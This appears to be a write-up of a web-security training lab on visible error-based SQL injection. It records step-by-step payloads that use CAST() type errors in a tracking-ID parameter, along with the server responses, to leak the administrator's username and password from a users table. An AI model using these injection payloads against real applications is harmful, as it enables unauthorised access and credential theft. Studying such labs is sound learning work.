@@ -1,0 +1,39 @@
+Visible error-based SQL injection
+
+Goal:
+- Exploit SQL injection to retrieve the admin user's credentials from the users table
+- Log into their account.
+
+Analysis:
+---------
+
+select trackingId from trackingIdTable where trackingId='TJEvbSkTXiSnvSYc''
+-> Internal Server Error, indicating that the trackingId field is vulnerable to
+   SQL Injection.
+
+Returned query from the error:
+-> SELECT * FROM tracking WHERE id = 'TJEvbSkTXiSnvSYc''. Expected  char
+
+SELECT * FROM tracking WHERE id = 'TJEvbSkTXiSnvSYc'--
+-> 200 OK
+
+
+CAST() = a function that allows you to convert one data type to another data type.
+
+
+' AND CAST((SELECT 1) as int)--
+-> ERROR: argument of AND must be type boolean, not type integer Position: 63
+
+' AND 1=CAST((SELECT 1) as int)--
+-> 200 OK
+
+TJEvbSkTXiSnvSYc' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+-> Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'TJEvbSkTXiSnvSYc' AND 1=CAST((SELECT username from users LIM'. Expected  char
+-> Remove the trackingId value and send only the payload.
+' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+-> ERROR: invalid input syntax for type integer: "administrator"
+-> It leaked the first username in the users table which is administrator.
+
+' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
+-> ERROR: invalid input syntax for type integer: "d0km9hx8gmceykdn1ujs"
+-> It leaked the admin password: d0km9hx8gmceykdn1ujs
